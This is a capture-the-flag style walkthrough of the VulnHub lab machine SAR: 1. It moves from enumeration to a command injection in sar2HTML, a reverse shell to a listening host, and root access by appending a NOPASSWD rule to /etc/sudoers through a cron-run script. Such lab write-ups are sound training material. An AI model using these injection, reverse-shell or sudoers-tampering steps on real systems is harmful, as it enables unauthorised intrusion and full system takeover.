<p align="center"><img src="https://github.com/AkaSec-1337-CyberSecurity-Club/Introduction/raw/main/light-14.jpg" alt="AkaSec 1337 CyberSecurity Club Logo"/><br></p>

# Introduction

Sar is an OSCP-Like VM with the intent of gaining experience in the world of penetration testing.

This box is on the <a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0">NetSecFocus Admin list</a> of OSCP-like machines. It’s <a href="https://www.vulnhub.com/entry/sar-1,425/">SAR: 1</a> from vulnhub.

## Setup Machine

First of all, I setup <a href="https://www.vulnhub.com/entry/sar-1,425/">sar machine</a> locally in a virtualMachine with the name **sar** then started it.
After starting the machine, I got its IP address using **VBoxManage** command
```bash
$> VBoxManage guestproperty enumerate sar | grep IP
```
<p align="center"><img src="screenShots/GetMachineIP.png" alt="Machine IP"/></p><br>

## Enumeration

### Nmap

The first step to penatrate a machine is gather information about it. After getting its IP address we can scan its to get open ports and service using **nmap** command

```bash
$> nmap FLAGS IPADDRESS
-A flag for aggressive scanning
-sV flag detect running services and their version
```

<p align="center"><img src="screenShots/Nmap.png" alt="Scan IP address with nmap"/></p><br>

### Fuzzing

The output shows that we have port 80 open, so we can access the ip via browser, The default page shows apache info page.
The next step is searching for more directories and files, to do that we can use **dirb** tool

```bash
$> dirb http://IPADDRESS/ /path/to/wordlist
```

<p align="center"><img src="screenShots/Dirb.png" alt="Fuzzing for more paths"/></p><br>

The output of **dirb** tool shows 3 valid paths, `index.html` which is the default apache page, `phpinfo.php` shows php info, and finally `robots.txt` that has `sar2HTML` text.
I put that text as path in URL and I got the following page

<p align="center"><img src="screenShots/sar2HTML.png" alt="sar2HTML page"/></p>

### Exploiting

After reading the content I decided to look up sar2Html in google, and I found that it is a service that has a Remote Code Execution vulnerability, I exploited it as described in <a href="https://www.exploit-db.com/exploits/47204">exploit-db</a>, `IPADDRESS/sar2HTML/index.php?plot=;<command>` this will execute the command and show the output of it in select host droplist at the left of the page.

<p align="center"><img src="screenShots/RunTheExploit.png" alt="Exploited sar2HTML"/></p>

After executing the command I immediately thought of a reverse shell, I found this <a href="https://github.com/AssassinUKG/sar2HTML">Reverse Shell for sar2HTML</a> and executed it as follow

```bash
$> ./sar2HTML -ip MACHINEIPADDRESS -rip LISTENING_SERVER_FOR_REVERSE_SHELL -pe DIRECTORY
```
running `rs session` on the webShell will create a server (listening on `IP:PORT` provided in `-rip` flag) with a Reverse Shell.<br>
After getting the reverse shell I started checking the current directory, which is `/sar2HTML`, then back one step to parent directory which is `/var/www/html`.<br>
I found in this directory 2 suspicious files, `finally.sh` with root as owner and `write.sh` with current user as owner which is `www-data`.<br>
After printing their content I found that `finally.sh` execute `write.sh` file, where `write.sh` file create `/tmp/gateway` file using `touch` command.<br>
That is all I could get for now.
<p align="center"><img src="screenShots/ReverseShell.png" alt="Reverse Shell"/></p>

### LinPEAS

For more information about the system we can use LinPEAS tool, this tool can find possible CVEs and vulnerabilities that we can exploit.<br>
<p align="center"><img src="screenShots/LinPEAS.png" alt="LinPEAS"/></p>
<p align="center"><img src="screenShots/Information.png" alt="LinPEAS"/></p>

After scrolling more and reading through the output, I found that the system is vulnerable to `CVE-2021-4043` (I won't exploit it for now).<br>
Reading more I found a cronjob that runs every 5 minutes, the cronjob was highlighted by the `LinPEAS tool`.<br>
The cronjob runs the `finally.sh` script that we found in `/var/www/html` as root, so whatever is written in `write.sh` will be run as root every 5 min.<br>
<p align="center"><img src="screenShots/VulnerabilityFound.png" alt="LinPEAS"/></p>
The way to privilege escalating is to set the current user `www-data` in the sudoers list in `/etc/sudoers` which can be updated only by the root.<br>
I appended to `write.sh` script some commands to check sudoers file, then added `echo "www-data ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers` to `write.sh` script.<br>
This will add the current user `www-data` to sudoers so he can run any command without password, Thus after 5 min I ran `sudo bash` as a sudoer and got bash with root privileges. 
<p align="center"><img src="screenShots/PrivilegeEscalating.png" alt="LinPEAS"/></p>


